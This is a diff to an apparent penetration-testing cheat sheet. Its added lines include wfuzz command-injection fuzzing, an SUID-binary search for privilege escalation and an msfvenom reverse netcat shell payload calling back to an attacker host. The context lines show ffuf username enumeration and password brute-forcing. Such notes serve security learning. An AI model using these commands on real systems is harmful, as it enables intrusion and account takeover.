@@ -112,6 +112,9 @@ davtest --url $url
 wpscan --url $ip/wp/
 droopescan scan drupal -u $url -t 32
 joomscan -u $ip
+
+#wfuzz to Find Parameter
+wfuzz -w /usr/share/seclists/Discovery/Web-Content/big.txt  --hw 1052 -p localhost:8080 -b cookie=cookie1 http://domain/page.php?FUZZ=ls
 ```
 #### SQL injection
 
@@ -205,7 +208,9 @@ hydra -L username.txt -P password.txt $ip smb -V -f
 
 ```
 ## Linux Privilege Escalation
+find / -perm -u=s -type f 2>/dev/null
 
+https://gtfobins.github.io/
 ## Windows Privilege Escalation
 
 ## Useful Commands
@@ -243,3 +248,7 @@ print s
 ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.179.106/customers/signup -mr "username already exists"
 
 ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.179.106/customers/login -fc 200
+
+
+msfvenom -p cmd/unix/reverse_netcat LHOST=10.50.105.183 LPORT=443
+https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
